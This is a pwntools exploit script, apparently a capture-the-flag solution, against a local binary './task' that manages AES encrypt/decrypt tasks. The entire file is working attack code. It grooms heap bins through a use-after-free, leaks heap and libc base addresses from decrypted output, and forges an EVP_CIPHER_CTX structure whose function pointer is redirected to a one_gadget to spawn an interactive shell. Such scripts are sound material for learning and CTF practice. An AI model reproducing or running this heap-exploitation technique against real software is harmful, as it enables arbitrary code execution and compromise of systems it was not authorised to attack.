#coding= utf-8
from pwn import *

context.terminal=["tmux","splitw","-h"]
a=process("./task")
elf=ELF("./task")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")

IV='A'*16
KEY='A'*32

def debug():
    gdb.attach(a,'''
    set scheduler-locking on
    b *(0x555555554000+0x00000000000141D)
    b *(0x555555554000+0x000000000001521)
    ''')
#add,delete
def menu(index):
    a.recvuntil("Choice: ")
    a.sendline(str(index))
def add(id,choice,size,data,key=KEY,iv=IV,is_go=False):
    if is_go==False:
        menu(1)
    else:
        a.sendline("1")
    a.recvuntil("Task id : ")
    a.sendline(str(id))
    a.recvuntil("Encrypt(1) / Decrypt(2): ")
    a.sendline(str(choice))
    a.recvuntil("Key : ")
    a.send(key)
    a.recvuntil("IV : ")
    a.send(IV)
    a.recvuntil("Data Size : ")
    a.sendline(str(size))
    a.recvuntil("Data : ")
    a.send(data)
def delete(id):
    menu(2)
    a.recvuntil("Task id : ")
    a.sendline(str(id))
def go(id):
    menu(3)
    a.recvuntil("Task id : ")
    a.sendline(str(id))
# chunk_info 0x80 , EVP_CIPHER_CTX 0xb0, EVP_CIPHER_CTX建的chunk 0x110 , data_chunk size可控
add(0,1,0x100,'A'*0x100)
add(1,1,0x100,'A'*0x100)
add(2,1,0x100,'A'*0x100)
add(3,1,0x100,'A'*0x100)

add(4,1,592,'A'*592)
add(5,1,0x70,'A'*0x70)
add(6,1,0x70,'A'*0x70)
add(7,1,0x70,'A'*0x70)

for i in range(4):
    delete(i)

go(4)
delete(4)
delete(5)
delete(6)
#0xb0: 6->5->4
#unsorted bin(0x110): 6->5->4 
add(8,1,0xa0,'A'*0xa0)#得到 4的EVP_CIPHER_CTX建的chunk,顺面拿出两个0xb0的chunk, 0xb0: 4
add(9,1,0xa0,'A'*0xa0)#得到 4的EVP_CIPHER_CTX

a.recvuntil("Ciphertext: \n")

string=""
for i in range(0,38): 
    temp=a.recvline().split()
    for i in temp:
        string+=chr(int(i,16))

add(10,2,len(string),string,is_go=True)  #解密
go(10)
a.readuntil('Ciphertext: \n')

temp=[]
for i in range(6):
    temp.append(a.recv(3)[:2])
temp.reverse()
heap_base=int("".join(temp),16)-0x1920
success("heap_base ==> 0x%x"%heap_base)

a.recvuntil("11 01 00 00 00 00 00 00 \na0 ")
temp=['a0']
for i in range(5):
    temp.append(a.recv(3)[:2])
temp.reverse()
libc_base=int("".join(temp),16)-352-libc.symbols["__malloc_hook"]-0x10
success("libc_base ==> 0x%x"%libc_base)
add(20,1,0x1,'A',is_go=True)#0x555555758650
add(21,1,0x1,'A')
go(20)
delete(20)
delete(21)
#0xb0:21->20

dest_chunk=heap_base+0x1650
one_gadget=libc_base+0x10a38c
success("one_gadget_addr ==> 0x%x"%one_gadget)
payload=p64(dest_chunk)+'\x00'*10+'\x10'#   test    byte ptr [rax+12h], 10h
payload=payload.ljust(32,'\x00')
payload+=p64(one_gadget)+p64(0)+p64(0)
payload=payload.ljust(0xa0,'\x00')
add(24,1,0xa0,payload)#data_chunk = task_20的EVP_CIPHER_CTX chunk
a.interactive()